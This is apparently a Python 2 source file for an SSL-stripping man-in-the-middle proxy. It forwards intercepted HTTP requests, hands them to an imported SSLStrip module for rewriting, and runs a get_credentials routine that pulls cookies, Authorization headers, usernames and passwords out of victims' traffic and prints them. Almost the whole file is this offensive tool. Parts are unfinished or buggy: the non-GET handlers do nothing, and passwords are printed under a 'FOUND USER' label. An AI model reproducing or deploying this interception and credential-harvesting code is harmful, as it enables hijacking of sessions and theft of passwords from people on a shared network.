from __future__ import print_function
import logging
logging.getLogger("httplib").setLevel(logging.ERROR)
import urllib2
import httplib
import ssl
import urlparse
import threading
from scapy.all import *
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
from cStringIO import StringIO
from SSLStrip import SSLStrip as SSLStrip

class ProxyRequestHandler(BaseHTTPRequestHandler):
    timeout = 10
    lock = threading.Lock()
    def __init__(self, *args, **kwargs):
        self.tls = threading.local()
        self.tls.socket = {}
        self.SSLStrip = SSLStrip()
        BaseHTTPRequestHandler.__init__(self, *args, **kwargs)

    @staticmethod
    def get_credentials(headers, body):
        if headers:
            cookie_pattern = [ 'Cookie:', 'cookie:']
            credentials_patern = ['Authorization:', 'authorization:', 'WWW-Authenticate', 'www-authenticate', 'Proxy-Authorization', 'Proxy-Authenticate']
            for h in headers:
                for pattern in cookie_pattern:
                    if re.search(pattern,  headers[h]):
                        print("\033[91mFOUND COOKIE: {}033[0m".format(headers[h]))
                for i in credentials_patern:
                    if re.search(i,  headers[h]):
                        print("\033[91mFOUND CREDENTIALS: {}033[0m".format(headers[h]))
        if body:
            user_regex = '([Uu]ser|[Ll]ogin|[Uu]sername|[Ii][Dd]|[Ee]mail|[Nn]ame)=([^&|;]*)'
            password_regex = '([Pp]assword|[Pp]ass|[Pp]wd|[Pp]asswd|[Pp]asswrd)=([^&|;]*)'
            raw = str(body.replace("\n"," "))
            users = re.findall(user_regex, raw)
            passwords = re.findall(password_regex, raw)
            if users:
                    print("\033[91mFOUND USER: {}033[0m".format(str(users[0][1])))
            if passwords:
                    print("\033[91mFOUND USER: {}033[0m".format(str(passwords[0][1])))    

    
    def do_GET(self):
        req = self
        content_length = int(req.headers.get('Content-Length', 0))
        req_body = self.rfile.read(content_length) if content_length else None
        if req.path[0] == '/':
            if isinstance(self.connection, ssl.SSLSocket):
                req.path = "https://%s%s" % (req.headers['Host'], req.path)
            else:
                req.path = "http://%s%s" % (req.headers['Host'], req.path)

        print("HTTP from: {} \033[94m\033[1m{}\033[0m\033[94m {}\033[0m".format(req.client_address[0][7::] ,req.command, req.path))
        self.get_credentials(req.headers, req_body)
        
        #### TODO: where tha magic happens
        self.SSLStrip.modify_request(req.headers, req_body)
        ###############
        
        url = urlparse.urlsplit(req.path)
        path = (url.path + '?' + url.query if url.query else url.path)        
        origin = (url.scheme, url.netloc)

        req.headers['Host'] = url.netloc

        setattr(req, 'headers', self.clean_headers(req.headers))
        
        try:
            if origin is not self.tls.socket:
                if url.scheme == 'https':
                    pass
                    #self.tls.socket = httplib.HTTPSConnection(netloc, timeout=self.timeout)
                else:
                    self.tls.socket = httplib.HTTPConnection(url.netloc, timeout=self.timeout)
            self.tls.socket.request(self.command, path, req_body, dict(req.headers))
            res = self.tls.socket.getresponse()
            setattr(res, 'headers', res.msg)
            setattr(res, 'response_version', {10: 'HTTP/1.0', 11: 'HTTP/1.1'})

            res_body = res.read()
        except Exception as e:
            print ("Exception ---> {}".format(e))
            return
        encode = res.headers.get('Content-Encoding', 'identity')
        #TODO: gerer la compression du body
        #### TODO: where tha magic happens
        self.SSLStrip.modify_response(req, res.msg, res_body)
        ###

        setattr(res, 'headers', self.clean_headers(res.headers))
        self.wfile.write("%s %d %s\r\n" % (self.protocol_version, res.status, res.reason))
        for line in res.headers.headers:
            self.wfile.write(line)
        self.end_headers()
        self.wfile.write(res_body)
        self.wfile.flush()
    
    def do_POST(self):
		print("HTTP from: {} \033[94m{} {}\033[0m".format(self.client_address[0][7::] ,self.command, self.path))
		pass
    def do_PUT(self):
		print("HTTP from: {} \033[94m{} {}\033[0m".format(self.client_address[0][7::] ,self.command, self.path))
		pass
    def do_PATCH(self):
		print("HTTP from: {} \033[94m{} {}\033[0m".format(self.client_address[0][7::] ,self.command, self.path))
		pass
    def do_DELETE(self):
		print("HTTP from: {} \033[94m{} {}\033[0m".format(self.client_address[0][7::] ,self.command, self.path))
		pass
    def do_TRACE(self):
		print("HTTP from: {} \033[94m{} {}\033[0m".format(self.client_address[0][7::] ,self.command, self.path))
		pass
    def do_CONNECT(self):
		print("HTTP from: {} \033[94m{} {}\033[0m".format(self.client_address[0][7::] ,self.command, self.path))
		pass

    do_HEAD = do_GET

    def clean_headers(self, headers):
        hop_by_hop = ('connection', 'keep-alive', 'proxy-authenticate',
                      'proxy-authorization', 'te', 'trailers', 'transfer-encoding', 'upgrade')
        for k in hop_by_hop:
            del headers[k]
        del headers['Accept-Encoding'] # mhhhhhhhhhHHH .........
        return headers
